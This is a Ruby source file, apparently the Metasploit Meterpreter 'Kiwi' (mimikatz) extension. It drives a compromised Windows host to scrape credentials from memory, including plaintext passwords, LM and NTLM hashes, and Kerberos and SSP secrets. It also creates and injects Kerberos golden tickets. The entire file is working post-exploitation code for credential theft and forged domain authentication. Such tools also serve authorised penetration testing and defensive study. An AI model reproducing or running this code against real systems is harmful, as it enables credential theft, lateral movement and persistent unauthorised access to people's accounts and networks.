# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/kiwi/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Kiwi

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###

class Kiwi < Extension

  PWD_ID_SEK_ALLPASS   = 0
  PWD_ID_SEK_WDIGEST   = 1
  PWD_ID_SEK_MSV       = 2
  PWD_ID_SEK_KERBEROS  = 3
  PWD_ID_SEK_TSPKG     = 4
  PWD_ID_SEK_LIVESSP   = 5
  PWD_ID_SEK_SSP       = 6
  PWD_ID_SEK_TICKETS   = 7
  PWD_ID_SEK_DPAPI     = 8

  def initialize(client)
    super(client, 'kiwi')

    client.register_extension_aliases(
      [
        {
          'name' => 'kiwi',
          'ext'  => self
        },
      ])
  end

  def golden_ticket_use(ticket)
    request = Packet.create_request('kiwi_golden_ticket_use')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TICKET, ticket, false, true)

    client.send_request(request)
  end

  def golden_ticket_create(user, domain, sid, tgt)
    request = Packet.create_request('kiwi_golden_ticket_create')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)

    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_KIWI_GOLD_TICKET)
  end

  def scrape_passwords(pwd_id)
    request = Packet.create_request('kiwi_scrape_passwords')
    request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
    response = client.send_request(request)

    results = []
    response.each(TLV_TYPE_KIWI_PWD_RESULT) do |r|
      results << {
        :username => r.get_tlv_value(TLV_TYPE_KIWI_PWD_USERNAME),
        :domain   => r.get_tlv_value(TLV_TYPE_KIWI_PWD_DOMAIN),
        :password => r.get_tlv_value(TLV_TYPE_KIWI_PWD_PASSWORD),
        :auth_hi => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_HI),
        :auth_lo => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_LO),
        :lm => r.get_tlv_value(TLV_TYPE_KIWI_PWD_LMHASH),
        :ntlm => r.get_tlv_value(TLV_TYPE_KIWI_PWD_NTLMHASH)
      }
    end

    return results
  end

  def all_pass
    return scrape_passwords(PWD_ID_SEK_ALLPASS)
  end

  def wdigest
    return scrape_passwords(PWD_ID_SEK_WDIGEST)
  end

  def msv
    return scrape_passwords(PWD_ID_SEK_MSV)
  end

  def livessp
    return scrape_passwords(PWD_ID_SEK_LIVESSP)
  end

  def ssp
    return scrape_passwords(PWD_ID_SEK_SSP)
  end

  def tspkg
    return scrape_passwords(PWD_ID_SEK_TSPKG)
  end

  def kerberos
    return scrape_passwords(PWD_ID_SEK_KERBEROS)
  end
end

end; end; end; end; end

